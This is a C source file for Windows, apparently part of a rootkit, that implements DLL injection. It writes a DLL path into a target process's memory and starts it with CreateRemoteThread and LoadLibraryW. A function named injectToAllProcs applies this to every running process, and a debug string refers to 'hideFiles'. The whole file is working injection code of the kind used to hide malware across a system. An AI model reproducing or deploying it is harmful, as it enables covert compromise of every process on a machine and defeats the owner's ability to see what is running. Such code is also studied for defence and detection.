#include "injector.h"

BOOL injectAndRun(const TCHAR* dllPath, DWORD processId) {
	LPVOID pInjectedDllAddr = injectToProc(dllPath, processId);
	if (NULL == pInjectedDllAddr) {
		debugOutputNum(L"Failed to inject DLL into process 0x%08lx", processId);
		return FALSE;
	}
	if (!runInjectedDLL(processId, pInjectedDllAddr, dllPath)) {
		debugOutputNum(L"Failed to run thread for process 0x%08lx", processId);
		return FALSE;
	}
	debugOutputNum(L"Successfully injected to  0x%08lx", processId);
	return TRUE;
}

LPVOID injectToProc(const TCHAR* dllPath, DWORD processId) {
	if (NULL == dllPath || 0 == processId) {
		debugOutput(L"Error in injectToProc: invalid input");
		return NULL;
	}
	HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId);
	if (NULL == hProcess) {
		debugOutputNum(L"Error in injectToProc. OpenProces failed (0x%08lx)\n", GetLastError());
		return NULL;
	}

	if (getCurProcArchitecture() != getProcArchitecture(processId, hProcess)) {
		debugOutput(L"Error in injectToProc. Injector and \"injectee\" platforms are not the same.");
		CloseHandle(hProcess);
		return NULL;
	}

	size_t dllPathSize = sizeof(TCHAR) * (wcslen(dllPath) + 1);
	LPVOID remoteDllPathAddr = VirtualAllocEx(hProcess,
		NULL,
		dllPathSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE);
	if (NULL == remoteDllPathAddr) {
		debugOutputNum(L"Error in injectToProc. VirtualAllocEx failed (0x%08lx)\n", GetLastError());
		CloseHandle(hProcess);
		return NULL;
	}
	SIZE_T numOfBytesWritten = 0;
	BOOL success = WriteProcessMemory(hProcess,
		remoteDllPathAddr,
		dllPath,
		dllPathSize,
		&numOfBytesWritten);

	if (!success || 0 == numOfBytesWritten) {
		debugOutputNum(L"Error in injectToProc. WriteProcessMemory failed (0x%08lx)\n", GetLastError());
		VirtualFreeEx(hProcess, remoteDllPathAddr, dllPathSize, MEM_RELEASE);
		CloseHandle(hProcess);
		return NULL;
	}

	CloseHandle(hProcess);
	return remoteDllPathAddr;
}

BOOL runInjectedDLL(DWORD processId, LPVOID pInjectedDllAddr, const TCHAR* dllPath) {
	BOOL retVal = FALSE;
	HANDLE hProcess = NULL;
	HANDLE hRemoteThread = NULL;

	if (NULL == pInjectedDllAddr) {
		debugOutput(L"Error in runInjectedDLL. Invalid input");
		goto cleanup; // retVal is FALSE
	}
	HMODULE ker32dll = GetModuleHandle(L"kernel32.dll");
	if (NULL == ker32dll) {
		debugOutputNum(L"Error in runInjectedDLL. GetModuleHandle failed (0x%08lx)\n", GetLastError());
		goto cleanup; // retVal is FALSE
	}
	LPVOID loadLibAddr = GetProcAddress(ker32dll, "LoadLibraryW");
	if (NULL == loadLibAddr) {
		debugOutputNum(L"Error in runInjectedDLL. GetProcAddress failed (0x%08lx)\n", GetLastError());
		goto cleanup; // retVal is FALSE
	}
	hProcess = OpenProcess(PROCESS_CREATE_THREAD, FALSE, processId);
	if (NULL == hProcess || INVALID_HANDLE_VALUE == hProcess) {
		debugOutputNum(L"Error in runInjectedDLL. OpenProcess failed (0x%08lx)\n", GetLastError());
		goto cleanup;
	}
	hRemoteThread = CreateRemoteThread(hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)loadLibAddr,
		pInjectedDllAddr,
		0,
		NULL);
	if (NULL == hRemoteThread) {
		debugOutputNum(L"Error in runInjectedDLL. CreateRemoteThread failed (0x%08lx)\n", GetLastError());
		retVal = FALSE;
		goto cleanup;
	}
	retVal = TRUE;

	// TODO: check if the process is suspended, if so, skip the injection (for now)
	
	// Waiting for the library to be loaded
	WaitForSingleObject(hRemoteThread, INJECTION_TIMEOUT);

cleanup: // cleaning up
	if (hRemoteThread) {
		CloseHandle(hRemoteThread);
		hRemoteThread = NULL;
	}
	if (pInjectedDllAddr && hProcess) {
		size_t dllPathSize = sizeof(TCHAR) * (wcslen(dllPath) + 1);
		VirtualFreeEx(hProcess, pInjectedDllAddr, dllPathSize, MEM_RELEASE);
	}
	return retVal;
}

BOOL injectToAllProcs(const TCHAR* dllPath32, const TCHAR* dllPath64) {
	DWORD procsList[MAX_NUMBER_OF_PROCS] = { 0 };
	DWORD numOfProcs = -1;
	
	if (!getAllProcsIds(procsList, MAX_NUMBER_OF_PROCS, &numOfProcs) || -1 == numOfProcs) {
		debugOutputNum(L"Error in injectToAllProcs: 0x%08lx\n", GetLastError());
		return FALSE;
	}
	for (unsigned int i = 0; i < numOfProcs; ++i) {
		DWORD processId = procsList[i];
		if (0 != processId) {
			DWORD isX64 = getProcArchitecture(processId, NULL);
			if (-1 == isX64) {
				debugOutputNum(L"Error in hideFiles. isProc64 failed (%d)", GetLastError());
				continue;
			}
			const TCHAR* dllToRun = (ARCH_64 == isX64) ? dllPath64 : dllPath32;
			if (!injectAndRun(dllToRun, processId)) {
				return FALSE; // the debug message was printed internally
			}
		}
	}
	return TRUE;
}